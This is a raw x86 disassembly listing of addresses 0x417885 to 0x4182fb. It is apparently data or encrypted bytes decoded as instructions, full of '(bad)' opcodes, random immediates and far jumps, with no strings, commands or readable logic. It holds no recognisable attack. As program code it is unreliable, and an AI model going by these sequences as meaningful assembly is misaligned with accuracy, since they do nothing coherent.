  417885:	scas   eax,DWORD PTR es:[edi]
  417886:	sub    DWORD PTR ds:0x82b80e0d,ebp
  41788c:	pop    ebp
  41788d:	dec    ebp
  41788e:	push   edi
  41788f:	sub    eax,0x38331762
  417894:	and    al,0xa6
  417896:	cmc    
  417897:	mov    eax,ds:0xd28e3f97
  41789c:	psrlq  mm6,QWORD PTR [ebx+0x3a]
  4178a0:	lds    eax,FWORD PTR ds:0x47110a3d
  4178a6:	ins    BYTE PTR es:[di],dx
  4178a8:	(bad)  
  4178a9:	retf   
  4178aa:	mov    fs,WORD PTR ds:0x579bf3e2
  4178b0:	xor    esp,esi
  4178b2:	outs   dx,BYTE PTR ds:[esi]
  4178b3:	inc    ecx
  4178b4:	pop    eax
  4178b5:	out    0xac,al
  4178b7:	sub    BYTE PTR [edi-0x3d],0xc
  4178bb:	call   0xf14f60e2
  4178c0:	jg     0x41786c
  4178c2:	mov    ebx,0x867ab089
  4178c7:	jo     0x4178e1
  4178c9:	fadd   DWORD PTR [edx]
  4178cb:	mov    ebx,0xb2532174
  4178d0:	mov    al,ds:0xab8f1419
  4178d5:	inc    ebx
  4178d6:	idiv   DWORD PTR [edx+ebx*8+0x7a67fce1]
  4178dd:	ins    DWORD PTR es:[edi],dx
  4178de:	add    ebx,ebp
  4178e0:	adc    BYTE PTR [edx],bh
  4178e2:	push   es
  4178e3:	xchg   ebp,eax
  4178e4:	imul   ecx,ecx,0x71
  4178e7:	in     eax,0x7e
  4178e9:	daa    
  4178ea:	inc    ecx
  4178eb:	imul   esi,DWORD PTR [esp+ecx*2],0xa184880d
  4178f2:	fcomi  st,st(0)
  4178f4:	ds xor al,0x8e
  4178f7:	sub    esi,DWORD PTR [eax+0x35a2b4cb]
  4178fd:	addr16 mov ebx,0xc075860c
  417903:	imul   esp,DWORD PTR [esi],0xffffffae
  417906:	or     BYTE PTR [ebp+0x32],al
  417909:	sub    edi,DWORD PTR [ebx]
  41790b:	xor    BYTE PTR [ebp-0x34],bh
  41790e:	leave  
  41790f:	add    BYTE PTR es:[eax],al
	...
  417972:	add    BYTE PTR [eax],al
  417974:	pop    eax
  417975:	inc    ecx
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	push   edx
  417981:	call   0x0:0xf9786239
  417988:	add    al,0x1
  41798a:	add    BYTE PTR [eax],al
  41798c:	pop    eax
  41798d:	mov    ecx,0x569ae3e0
  417992:	aam    0x90
  417994:	and    al,0x57
  417996:	jbe    0x417980
  417998:	xor    eax,0xa7755986
  41799d:	les    esi,FWORD PTR [edx-0xb]
  4179a0:	je     0x417989
  4179a2:	mov    ah,0xb9
  4179a4:	or     DWORD PTR [ebx],ebx
  4179a6:	std    
  4179a7:	mov    ds:0x3f2b4a6f,eax
  4179ac:	pop    ds
  4179ad:	retf   
  4179ae:	sbb    DWORD PTR [ebp-0x3a],ebp
  4179b1:	xor    al,0xf3
  4179b3:	shl    BYTE PTR [ebx],1
  4179b5:	mov    ebp,0x57e1df83
  4179ba:	pushf  
  4179bb:	mov    al,0xf1
  4179bd:	imul   ebx,DWORD PTR [esi],0xad0098ff
  4179c3:	sub    ecx,edx
  4179c5:	ins    BYTE PTR es:[edi],dx
  4179c6:	imul   eax,DWORD PTR [ecx],0x9b0676f3
  4179cc:	pop    eax
  4179cd:	xlat   BYTE PTR ds:[ebx]
  4179ce:	les    eax,FWORD PTR [ebp+0xc]
  4179d1:	ja     0x4179f7
  4179d3:	cmp    ebp,edx
  4179d5:	imul   esi,DWORD PTR [eax-0x46c48c1f],0x15
  4179dc:	xchg   ebp,eax
  4179dd:	inc    eax
  4179de:	mov    WORD PTR [esi],cs
  4179e0:	(bad)  
  4179e1:	sbb    edi,DWORD PTR [edi-0x325b5e8d]
  4179e7:	pop    eax
  4179e8:	add    DWORD PTR [edx],ebp
  4179ea:	jo     0x417a00
  4179ec:	rol    BYTE PTR [eax+0x30],cl
  4179ef:	cli    
  4179f0:	loop   0x417a5a
  4179f2:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179f4:	pushf  
  4179f5:	xor    BYTE PTR [ebx+0x3c],0x91
  4179f9:	push   0x52
  4179fb:	sti    
  4179fc:	addr16 jae 0x41799d
  4179ff:	jbe    0x417987
  417a01:	int    0xe0
  417a03:	or     DWORD PTR [ecx+0x61],esi
  417a06:	ins    DWORD PTR es:[edi],dx
  417a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a08:	cmp    BYTE PTR ss:[ebx],ah
  417a0b:	sbb    BYTE PTR [ebx],bl
  417a0d:	jle    0x417a72
  417a0f:	lock xor eax,0xe008d7da
  417a15:	sar    DWORD PTR [edi-0x41],0xd3
  417a19:	xchg   DWORD PTR [eax+0x14],ebp
  417a1c:	cs mov fs,edx
  417a1f:	sub    edi,DWORD PTR [edi+0x65]
  417a22:	sbb    DWORD PTR [eax-0x13c839f9],edi
  417a28:	mov    DWORD PTR [edi+0x50],edi
  417a2b:	sahf   
  417a2c:	push   cs
  417a2d:	popf   
  417a2e:	mov    ah,0x7e
  417a30:	push   edx
  417a31:	jns    0x417a25
  417a33:	loopne 0x4179ed
  417a35:	test   DWORD PTR [eax],esi
  417a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a38:	(bad)  
  417a39:	fsubrp st(0),st
  417a3b:	out    dx,al
  417a3c:	dec    edx
  417a3d:	mov    al,0x24
  417a3f:	fnstcw WORD PTR [eax+0x2ca337f7]
  417a45:	out    0x22,eax
  417a47:	fdivp  st(5),st
  417a49:	mov    ds:0x416fa26d,al
  417a4e:	pop    ss
  417a4f:	mov    ds:0xc32fece3,eax
  417a54:	gs out dx,al
  417a56:	mov    bh,BYTE PTR [ebx+0x348b744]
  417a5c:	mov    ecx,0xad541938
  417a61:	or     ecx,DWORD PTR [edx+0x64]
  417a64:	add    DWORD PTR [edx-0x178a38c9],eax
  417a6a:	jne    0x417a2f
  417a6c:	and    eax,0x95047e60
  417a71:	jb     0x417a59
  417a73:	int    0x98
  417a75:	mov    DWORD PTR cs:[ebx+edx*4+0x5b7eebcc],eax
  417a7d:	or     al,0xb6
  417a7f:	jle    0x417a72
  417a81:	sub    BYTE PTR [ecx],0x67
  417a84:	lock test BYTE PTR [ebx-0x5fd41324],dl
  417a8b:	mov    ch,0x3f
  417a8d:	dec    esi
  417a8e:	loop   0x417b0a
	...
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x2d15414a]
  417b04:	jl     0x417b00
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    al,0x1
  417b0a:	add    BYTE PTR [eax],al
  417b0c:	jno    0x417b0f
  417b0e:	pop    ds
  417b0f:	int3   
  417b10:	out    dx,al
  417b11:	inc    esi
  417b12:	jmp    0x99e9:0xe975ed49
  417b19:	xchg   esi,eax
  417b1a:	addr16 (bad) 
  417b1c:	nop
  417b1d:	dec    esi
  417b1e:	dec    ebx
  417b1f:	repnz or DWORD PTR [ebp-0x5a],ebx
  417b23:	data16 xor BYTE PTR [ebx+0x61ed7c78],cl
  417b2a:	loope  0x417b91
  417b2c:	jno    0x417b87
  417b2e:	xchg   ecx,eax
  417b2f:	mov    ds:0xa9abbf8c,al
  417b34:	jmp    0x3bcb68f7
  417b39:	add    al,0x38
  417b3b:	adc    ebp,DWORD PTR [ecx-0x49]
  417b3e:	lods   eax,DWORD PTR ds:[esi]
  417b3f:	sub    dh,BYTE PTR [ebp-0x42c35eea]
  417b45:	cmc    
  417b46:	xchg   ebp,eax
  417b47:	lods   al,BYTE PTR ds:[esi]
  417b48:	retf   
  417b49:	aas    
  417b4a:	fldln2 
  417b4c:	jmp    0x417b6e
  417b4e:	pop    edx
  417b4f:	sar    ebx,cl
  417b51:	std    
  417b52:	in     al,0x43
  417b54:	and    BYTE PTR [esi+0x5d],cl
  417b57:	cmp    ecx,edx
  417b59:	or     al,BYTE PTR [edi+ebp*1+0x71f4053f]
  417b60:	ja     0x417bb5
  417b62:	add    ch,BYTE PTR [ebp-0x78]
  417b65:	push   cs
  417b66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b67:	inc    esp
  417b68:	ret    0x9d8
  417b6b:	dec    ebp
  417b6c:	dec    ecx
  417b6d:	out    0x8a,al
  417b6f:	pop    es
  417b70:	mov    ah,BYTE PTR [ebp-0x12]
  417b73:	add    al,0xa8
  417b75:	add    BYTE PTR [ecx],al
  417b77:	and    DWORD PTR [eax+0x16],eax
  417b7a:	leave  
  417b7b:	sbb    eax,0xef16a885
  417b80:	pushf  
  417b81:	into   
  417b82:	out    dx,eax
  417b83:	adc    dl,BYTE PTR [edx-0x43]
  417b86:	int3   
  417b87:	mov    es,esp
  417b89:	and    cl,al
  417b8b:	push   ds
  417b8c:	int3   
  417b8d:	and    ah,al
  417b8f:	sbb    esp,DWORD PTR [esi+0x824e2fd]
  417b95:	jmp    0x568a4b8c
  417b9a:	inc    ebp
  417b9b:	std    
  417b9c:	adc    dh,BYTE PTR [edx]
  417b9e:	aaa    
  417b9f:	pushfw 
  417ba1:	test   al,0x51
  417ba3:	cli    
  417ba4:	lods   al,BYTE PTR gs:[esi]
  417ba6:	stos   BYTE PTR es:[edi],al
  417ba7:	sar    DWORD PTR [esi-0x4f],1
  417baa:	add    BYTE PTR [eax+0x69],dl
  417bad:	push   cs
  417bae:	jmp    0x272b:0x8c11d3e8
  417bb5:	repnz jmp 0x44cc:0xc364ab20
  417bbd:	jl     0x417b46
  417bbf:	or     BYTE PTR [edx+0x33],0x8d
  417bc3:	dec    ebp
  417bc4:	pushf  
  417bc5:	mov    al,ds:0xaa53806d
  417bca:	pop    esp
  417bcb:	fistp  DWORD PTR ds:0xb899abba
  417bd1:	and    ecx,ecx
  417bd3:	sub    al,0x76
  417bd5:	sub    eax,DWORD PTR [ecx]
  417bd7:	or     eax,0x9e1e915a
  417bdc:	dec    esp
  417bdd:	mov    bh,0xef
  417bdf:	sub    ch,BYTE PTR [ebx]
  417be1:	int3   
  417be2:	stc    
  417be3:	or     al,bl
  417be5:	sbb    al,0xf2
  417be7:	or     dh,BYTE PTR [esi+0x2]
  417bea:	in     eax,0xa0
  417bec:	mov    ebp,0xaea68394
  417bf1:	pop    edx
  417bf2:	or     dl,ah
  417bf4:	cmp    eax,0xb5bc4846
  417bf9:	push   esp
  417bfa:	xor    BYTE PTR [esi],ah
  417bfc:	ins    DWORD PTR es:[edi],dx
  417bfd:	cmp    BYTE PTR [ecx],cl
  417bff:	(bad)  [edx-0x30]
  417c02:	dec    edi
  417c03:	popa   
  417c04:	sbb    DWORD PTR [eax],esi
  417c06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c07:	and    DWORD PTR [edi+0x636c2d9e],eax
  417c0d:	sub    ah,BYTE PTR [ebx+0x87]
	...
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x4e
  417c81:	mov    al,ds:0xfb8091bb
  417c86:	add    BYTE PTR [eax],al
  417c88:	add    al,0x1
  417c8a:	add    BYTE PTR [eax],al
  417c8c:	lods   eax,DWORD PTR ds:[esi]
  417c8d:	xor    edx,DWORD PTR [esi-0x284f504f]
  417c93:	and    eax,0xa56eb5c5
  417c98:	ins    DWORD PTR es:[edi],dx
  417c99:	push   ss
  417c9a:	mov    edi,0x3ddb5b3b
  417c9f:	add    cl,BYTE PTR ds:0x9bb05d96
  417ca5:	loope  0x417c44
  417ca7:	ds in  al,0xef
  417caa:	and    eax,0xc3a55f4b
  417caf:	jmp    DWORD PTR [ecx]
  417cb1:	push   ss
  417cb2:	aam    0xa2
  417cb4:	repz test al,0xb7
  417cb7:	push   ds
  417cb8:	xlat   BYTE PTR ds:[ebx]
  417cb9:	sub    al,0x0
  417cbb:	test   dh,cl
  417cbd:	stc    
  417cbe:	int3   
  417cbf:	pop    ds
  417cc0:	inc    ebp
  417cc1:	mov    dh,0x7c
  417cc3:	xchg   DWORD PTR [esi*8-0x3f68f9c2],edi
  417cca:	sar    eax,1
  417ccc:	xchg   DWORD PTR [ebx+0x42a00fbf],edx
  417cd2:	push   esi
  417cd3:	mov    bh,0xf0
  417cd5:	iret   
  417cd6:	cmp    DWORD PTR [ebx+ebp*4+0xc9011d3],eax
  417cdd:	jp     0x417c91
  417cdf:	dec    eax
  417ce0:	imul   esi,DWORD PTR [edi+0x7031872a],0xffffff80
  417ce7:	ds sub eax,0xf6cc00da
  417ced:	inc    eax
  417cee:	jmp    0xec08:0x416daa31
  417cf5:	adc    esp,ecx
  417cf7:	cld    
  417cf8:	fucomi st,st(5)
  417cfa:	cmp    dh,al
  417cfc:	int3   
  417cfd:	mov    ebx,0xf850f29e
  417d02:	arpl   WORD PTR [ebx-0x73],dx
  417d05:	icebp  
  417d06:	outs   dx,DWORD PTR ds:[esi]
  417d07:	xor    eax,0x2938e161
  417d0c:	ret    
  417d0d:	test   al,0xa2
  417d0f:	push   0x9a2d37e4
  417d14:	inc    DWORD PTR [ecx+0x19494553]
  417d1a:	and    ecx,ebp
  417d1c:	xor    al,0x3
  417d1e:	pop    edx
  417d1f:	aam    0x39
  417d21:	scas   al,BYTE PTR es:[edi]
  417d22:	test   al,0xeb
  417d24:	add    al,0x12
  417d26:	stos   DWORD PTR es:[edi],eax
  417d27:	lahf   
  417d28:	out    dx,al
  417d29:	ror    BYTE PTR [ebp+0x5779a9f5],1
  417d2f:	jg     0x417d27
  417d31:	mov    ?,WORD PTR [edi-0x69]
  417d34:	push   esp
  417d35:	xchg   BYTE PTR [esi],al
  417d37:	into   
  417d38:	jmp    0x1ba3:0x4fd541f5
  417d3f:	in     eax,dx
  417d40:	jle    0x417da9
  417d42:	shl    BYTE PTR [esi],0x18
  417d45:	mov    eax,ds:0x4543ae10
  417d4a:	test   eax,0x9262ed90
  417d4f:	aad    0x18
  417d51:	cs jae 0x417dbf
  417d54:	xor    eax,0xffa67c93
  417d59:	pop    eax
  417d5a:	lods   eax,DWORD PTR ds:[esi]
  417d5b:	jg     0x417d2c
  417d5d:	daa    
  417d5e:	mov    bl,0xa2
  417d60:	and    DWORD PTR [ebp+0x21abcec],0xc56b0185
  417d6a:	in     eax,0x9a
  417d6c:	outs   dx,DWORD PTR ds:[esi]
  417d6d:	aas    
  417d6e:	imul   edx,DWORD PTR [edi+edi*4+0x720b748],0x33a5a4b3
  417d79:	xchg   ebp,eax
  417d7a:	pusha  
  417d7b:	xor    esp,edi
  417d7d:	hlt    
  417d7e:	fs addr16 aam 0xad
  417d82:	xchg   ebx,eax
  417d83:	inc    eax
  417d84:	mov    esi,0x9e0c4264
  417d89:	loop   0x417d40
  417d8b:	imul   ecx,eax,0x34
  417d8e:	adc    al,0xd2
	...
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	cmp    al,0x4b
  417e02:	lods   al,BYTE PTR ds:[esi]
  417e03:	ret    0xfc84
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    al,0x1
  417e0a:	add    BYTE PTR [eax],al
  417e0c:	jnp    0x1a0a66d9
  417e12:	lock sti 
  417e14:	lods   eax,DWORD PTR ds:[esi]
  417e15:	or     DWORD PTR [esi+0x7ed565a2],ecx
  417e1b:	add    bl,BYTE PTR [edi]
  417e1d:	and    al,0xd7
  417e1f:	adc    eax,0x396f48ec
  417e24:	xchg   ebp,eax
  417e25:	ja     0x417e62
  417e27:	and    edi,ebx
  417e29:	pop    ecx
  417e2a:	and    eax,0x4d1f2074
  417e2f:	mov    ds:0x5cb45c46,al
  417e34:	xor    ah,BYTE PTR [eax+ebx*4+0x162ac964]
  417e3b:	mov    esi,0x285816c0
  417e40:	fldenv ds:0xb5325e93
  417e46:	xlat   BYTE PTR ds:[ebx]
  417e47:	lds    esi,FWORD PTR ds:0xdb4c2487
  417e4d:	add    DWORD PTR [ebp+0x159904af],edi
  417e53:	scas   al,BYTE PTR es:[edi]
  417e54:	jle    0x417e50
  417e56:	jae    0x417de2
  417e58:	mov    cl,0x26
  417e5a:	retf   
  417e5b:	sub    eax,0x55a8a30a
  417e60:	jmp    0x3cf9:0x14b991a2
  417e67:	sbb    ebx,DWORD PTR [edi-0x17]
  417e6a:	dec    edx
  417e6b:	sbb    eax,0xa62b0419
  417e70:	in     eax,0x7b
  417e72:	hlt    
  417e73:	jb     0x417e4d
  417e75:	cs int 0xac
  417e78:	jmp    DWORD PTR [eax+0x53fba3b3]
  417e7e:	sti    
  417e7f:	adc    edx,edi
  417e81:	sub    DWORD PTR [ebp+0x64fa01e7],eax
  417e87:	(bad)  [ebx]
  417e89:	mov    al,0xa0
  417e8b:	mov    eax,0x6590ff21
  417e90:	icebp  
  417e91:	pusha  
  417e92:	ret    
  417e93:	lds    ebp,FWORD PTR [ebp-0x15905cb1]
  417e99:	scas   eax,DWORD PTR es:[edi]
  417e9a:	mov    ch,bh
  417e9c:	pop    ebp
  417e9d:	enter  0xd886,0x4e
  417ea1:	sbb    ebp,DWORD PTR [ebx+ebp*8-0x4b]
  417ea5:	out    0x50,eax
  417ea7:	sbb    eax,0x6e02bc05
  417eac:	outs   dx,BYTE PTR ds:[esi]
  417ead:	fisub  WORD PTR [ebx+esi*1]
  417eb0:	push   esp
  417eb1:	out    dx,al
  417eb2:	or     bl,BYTE PTR [eax]
  417eb4:	push   ds
  417eb5:	adc    al,0xad
  417eb7:	cmp    ebx,DWORD PTR ds:0x29b7cd80
  417ebd:	(bad)  
  417ebe:	mov    ds:0xf375b853,eax
  417ec3:	aaa    
  417ec4:	(bad)  
  417ec5:	cmp    esi,DWORD PTR [eax-0x7d]
  417ec8:	fst    DWORD PTR [ecx]
  417eca:	retf   
  417ecb:	add    BYTE PTR [edi+0x14cc9e18],dh
  417ed1:	test   eax,0xf258577b
  417ed6:	in     eax,0x2e
  417ed8:	es sub eax,0xcaa5ad04
  417ede:	push   ebx
  417edf:	pop    ds
  417ee0:	test   cl,dl
  417ee2:	push   esi
  417ee3:	add    BYTE PTR [ebx],dh
  417ee5:	test   DWORD PTR [eax-0x6b2c7269],0x8d84c942
  417eef:	outs   dx,DWORD PTR ds:[esi]
  417ef0:	imul   esp,DWORD PTR [esp+edi*4+0x61612a1d],0x27c08e7a
  417efb:	popa   
  417efc:	ds pop edx
  417efe:	out    0x64,eax
  417f00:	cs or  eax,0xb9f988d5
  417f06:	gs out 0x9,eax
  417f09:	int    0xc2
  417f0b:	jno    0x417f47
  417f0d:	add    dh,BYTE PTR [eax+0x7f]
	...
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	inc    ebp
  417f81:	stc    
  417f82:	cs mov esi,0xfd88
  417f88:	add    al,0x1
  417f8a:	add    BYTE PTR [eax],al
  417f8c:	adc    DWORD PTR [ebp-0x55],edx
  417f8f:	loop   0x417fcf
  417f91:	scas   al,BYTE PTR es:[edi]
  417f92:	and    BYTE PTR [edi-0x45],ch
  417f95:	mov    al,0xb0
  417f97:	test   al,0x89
  417f99:	cld    
  417f9a:	mov    dl,0x6b
  417f9c:	or     ecx,ebx
  417f9e:	popa   
  417f9f:	mov    WORD PTR [ecx-0x527d315a],gs
  417fa5:	scas   eax,DWORD PTR es:[edi]
  417fa6:	cmp    DWORD PTR [edi],edi
  417fa8:	mov    al,bl
  417faa:	imul   edi,esp,0x15b93831
  417fb0:	dec    ebx
  417fb1:	sub    DWORD PTR [eax+0x2756ffcb],ecx
  417fb7:	xor    ah,dl
  417fb9:	mov    dl,0x13
  417fbb:	sub    eax,0x56d5c59f
  417fc0:	test   DWORD PTR [edi-0x6b],eax
  417fc3:	ss pop ebp
  417fc5:	xchg   ebx,eax
  417fc6:	fistp  WORD PTR [edx+0x20c072ca]
  417fcc:	add    dh,cl
  417fce:	arpl   WORD PTR [esi+0x7863ed1e],bp
  417fd4:	in     al,0xd6
  417fd6:	(bad)  
  417fd7:	sar    DWORD PTR [edi],cl
  417fd9:	mov    edi,0x6d1b1f6e
  417fde:	xor    ecx,DWORD PTR [ebp-0x38a27c26]
  417fe4:	test   BYTE PTR [eax],dl
  417fe6:	pop    edi
  417fe7:	(bad)  
  417fe8:	loop   0x417fb4
  417fea:	outs   dx,DWORD PTR ds:[esi]
  417feb:	cli    
  417fec:	or     DWORD PTR [esi+0x0],eax
  417fef:	xor    eax,0x54f0adb0
  417ff4:	or     DWORD PTR [ebx+0xf],eax
  417ff7:	scas   eax,DWORD PTR es:[edi]
  417ff8:	pop    edi
  417ff9:	jmp    0x417faf
  417ffb:	pop    edi
  417ffc:	jmp    0xe88decda
  418001:	pop    ebp
  418002:	push   esp
  418003:	mov    BYTE PTR [edx-0x7],ch
  418006:	jne    0x418047
  418008:	(bad)  
  418009:	ins    BYTE PTR es:[edi],dx
  41800a:	stos   BYTE PTR es:[edi],al
  41800b:	inc    esp
  41800c:	int3   
  41800d:	cmp    al,0x43
  41800f:	pop    esp
  418010:	enter  0xff23,0xef
  418014:	call   0xab96:0x2dc6e244
  41801b:	imul   esp,DWORD PTR [ecx+0x45c686ec],0xffffff9d
  418022:	stos   BYTE PTR es:[edi],al
  418023:	add    ebx,ebp
  418025:	mov    eax,ds:0x1ce38d61
  41802a:	push   cs
  41802b:	sub    eax,0x70d6e490
  418030:	das    
  418031:	xchg   BYTE PTR [ecx+0x65a604bd],al
  418037:	fcmovne st,st(7)
  418039:	cmp    ch,BYTE PTR [ecx-0x2599e9b5]
  41803f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418040:	test   DWORD PTR [edx-0xc0d5dfd],esi
  418046:	mov    ecx,0xc36a73b0
  41804b:	pop    esp
  41804c:	pop    esi
  41804d:	scas   eax,DWORD PTR es:[edi]
  41804e:	sub    ebx,DWORD PTR [ecx]
  418050:	mov    esp,0x21fb908a
  418055:	pushf  
  418056:	adc    ah,0x36
  418059:	inc    ebx
  41805a:	jnp    0x418090
  41805c:	sub    esp,DWORD PTR [ecx+0x20db7778]
  418062:	or     ebx,esp
  418064:	in     eax,0xfc
  418066:	or     DWORD PTR [edi+0x6c],esp
  418069:	jmp    DWORD PTR [eax]
  41806b:	gs inc eax
  41806d:	pusha  
  41806e:	ret    0x9d0d
  418071:	(bad)  
  418072:	hlt    
  418073:	pusha  
  418074:	icebp  
  418075:	pusha  
  418076:	adc    eax,0xb93f2aba
  41807b:	leave  
  41807c:	mul    dl
  41807e:	xchg   edx,eax
  41807f:	mov    al,BYTE PTR [edx]
  418081:	aad    0x8f
  418083:	adc    BYTE PTR [ecx-0x3b06051f],0xa6
  41808a:	push   0x1dc001bd
  41808f:	stc    
	...
  4180f4:	test   eax,0xff456b7e
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x1a2fdebc,eax
  418101:	scas   eax,DWORD PTR es:[edi]
  418102:	or     al,dl
  418104:	mov    esi,?
  418106:	add    BYTE PTR [eax],al
  418108:	add    al,0x1
  41810a:	add    BYTE PTR [eax],al
  41810c:	push   ebp
  41810d:	add    edi,DWORD PTR es:[esi+0x76]
  418111:	push   esp
  418112:	(bad)  
  418114:	sbb    DWORD PTR [eax+0x28],esi
  418117:	mov    dh,0xc9
  418119:	fnstcw WORD PTR [ebx-0x3c]
  41811c:	retf   
  41811d:	lds    ebx,FWORD PTR [edi-0x49]
  418120:	push   cs
  418121:	or     esi,DWORD PTR ds:0xc0fbde68
  418127:	das    
  418128:	imul   ebp,DWORD PTR [ecx],0x47
  41812b:	loope  0x4180fa
  41812d:	inc    ebx
  41812e:	fstp   DWORD PTR [edi+0x7eb04d9f]
  418134:	or     DWORD PTR [ebx],edx
  418136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418137:	loop   0x41810c
  418139:	test   DWORD PTR [ebp+0x684f887c],0xe563d615
  418143:	push   es
  418144:	sub    edi,DWORD PTR [esi]
  418146:	mov    cl,0x71
  418148:	idiv   DWORD PTR [esi+0x79d239a1]
  41814e:	(bad)  
  418150:	iret   
  418151:	std    
  418152:	(bad)  
  418153:	mov    ecx,0xbc2c2f30
  418158:	aam    0x8c
  41815a:	daa    
  41815b:	popf   
  41815c:	jbe    0x41814f
  41815e:	mov    dh,0x7f
  418160:	cli    
  418161:	mov    esp,0xda656df2
  418166:	sub    DWORD PTR [ecx+0x50],ecx
  418169:	outs   dx,DWORD PTR ds:[esi]
  41816a:	pop    esp
  41816b:	sbb    BYTE PTR [ebx+0x2376e1df],dl
  418171:	add    DWORD PTR [edi+0x4b9dca72],edi
  418177:	cmp    ch,BYTE PTR [esi+0x43]
  41817a:	arpl   WORD PTR [ecx-0x17],bp
  41817d:	clc    
  41817e:	addr16 daa 
  418180:	(bad)  
  418181:	call   0x3cfe2bb6
  418186:	and    al,0xb
  418188:	outs   dx,BYTE PTR ds:[esi]
  418189:	or     ah,BYTE PTR [edi-0x5e1d7044]
  41818f:	dec    ebx
  418190:	xor    BYTE PTR [edi],ah
  418192:	xchg   ecx,eax
  418193:	xor    BYTE PTR [ecx],0x50
  418196:	jg     0x41817d
  418198:	dec    ecx
  418199:	(bad)  
  41819a:	sub    eax,0x8cf1b56c
  41819f:	or     edx,DWORD PTR [ebp-0x7a102f54]
  4181a5:	mov    al,dl
  4181a7:	mov    ecx,esi
  4181a9:	mov    ebx,0xb44bd84e
  4181ae:	jno    0x418140
  4181b0:	std    
  4181b1:	lea    esi,[eax-0x52778b15]
  4181b7:	xor    eax,0xff2591cf
  4181bc:	push   cs
  4181bd:	jmp    0x851088fe
  4181c2:	xor    esp,ebx
  4181c4:	jno    0x418239
  4181c6:	dec    edi
  4181c7:	fwait
  4181c8:	mov    ebp,0x86557995
  4181cd:	ins    BYTE PTR es:[edi],dx
  4181ce:	or     BYTE PTR [edi],dh
  4181d0:	mov    WORD PTR ds:0x600a66f2,ds
  4181d6:	jg     0x4181a9
  4181d8:	and    al,0xeb
  4181da:	aad    0xad
  4181dc:	sahf   
  4181dd:	push   ss
  4181de:	and    DWORD PTR [edi],ebp
  4181e0:	test   edx,0xe410c43b
  4181e6:	out    dx,al
  4181e7:	add    eax,0x79971300
  4181ec:	or     BYTE PTR [edi-0x7314fd9],al
  4181f2:	stos   BYTE PTR es:[edi],al
  4181f3:	and    cl,bh
  4181f5:	(bad)  [esi+0x6d]
  4181f8:	mov    DWORD PTR [edx],esi
  4181fa:	xor    eax,0xec83cab4
  4181ff:	les    edx,FWORD PTR [ecx+0x13]
  418202:	popf   
  418203:	sbb    DWORD PTR [edi-0x1],edx
  418206:	or     cl,BYTE PTR [esp+edi*4-0x573d1563]
  41820d:	xchg   ebx,eax
  41820e:	push   esi
  41820f:	retf   
	...
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0xfedeb8d6
  418282:	fcom   st(2)
  418284:	nop
  418285:	inc    DWORD PTR [eax]
  418287:	add    BYTE PTR [ecx+eax*1],al
  41828a:	add    BYTE PTR [eax],al
  41828c:	cwde   
  41828d:	in     eax,dx
  41828e:	aam    0xbb
  418290:	pop    ecx
  418291:	ja     0x4182a0
  418293:	ja     0x41830d
  418295:	loop   0x4182b6
  418297:	sbb    edx,ecx
  418299:	mov    ds:0xe0ea4eda,eax
  41829e:	adc    ebp,eax
  4182a0:	sbb    edi,DWORD PTR [eax]
  4182a2:	rcr    BYTE PTR [ebx-0x41],1
  4182a5:	push   ecx
  4182a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182a7:	jno    0x418285
  4182a9:	out    dx,eax
  4182aa:	sti    
  4182ab:	dec    esi
  4182ac:	dec    eax
  4182ad:	cmc    
  4182ae:	xchg   edx,eax
  4182af:	sbb    BYTE PTR [ecx],dh
  4182b1:	sub    al,BYTE PTR [edx+0x73]
  4182b4:	sbb    eax,0xa057c1d6
  4182b9:	sbb    esp,eax
  4182bb:	daa    
  4182bc:	sub    eax,0xbb904086
  4182c1:	xor    DWORD PTR ds:0xb4308351,0x6fd4c712
  4182cb:	pop    es
  4182cc:	aad    0x38
  4182ce:	dec    cx
  4182d0:	dec    ecx
  4182d1:	std    
  4182d2:	in     eax,0x6d
  4182d4:	retf   0xea85
  4182d7:	inc    ebx
  4182d8:	cmc    
  4182d9:	cdq    
  4182da:	leave  
  4182db:	xlat   BYTE PTR ds:[ebx]
  4182dc:	in     al,dx
  4182dd:	mov    ds:0x7b88a0d2,eax
  4182e2:	dec    edi
  4182e3:	in     eax,dx
  4182e4:	or     al,0x7c
  4182e6:	in     al,dx
  4182e7:	jl     0x4182d3
  4182e9:	jno    0x4182a9
  4182eb:	imul   ebx,DWORD PTR [eax+0x217f9636],0xddc986c9
  4182f5:	sahf   
  4182f6:	dec    edx
  4182f7:	cmp    eax,edx
  4182f9:	stos   DWORD PTR es:[edi],eax
  4182fa:	inc    edi
  4182fb:	pop    ss
